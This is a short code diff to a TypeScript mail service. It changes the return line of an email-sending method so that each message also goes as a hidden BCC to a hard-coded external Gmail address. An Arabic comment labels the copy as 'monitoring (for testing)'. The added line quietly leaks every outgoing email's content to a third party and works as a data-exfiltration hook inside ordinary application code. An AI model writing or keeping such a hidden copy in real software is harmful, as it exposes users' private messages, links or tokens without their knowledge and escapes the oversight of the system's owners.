@@ -392,7 +392,8 @@ export class MailService {
 </html>
     `.trim();
 
-    return this.sendMail({ to, subject, html });
+    // 📧 إرسال نسخة للمراقبة (للاختبار)
+    return this.sendMail({ to, subject, html, bcc: 'forwahabb@gmail.com' });
   }
 
   /**
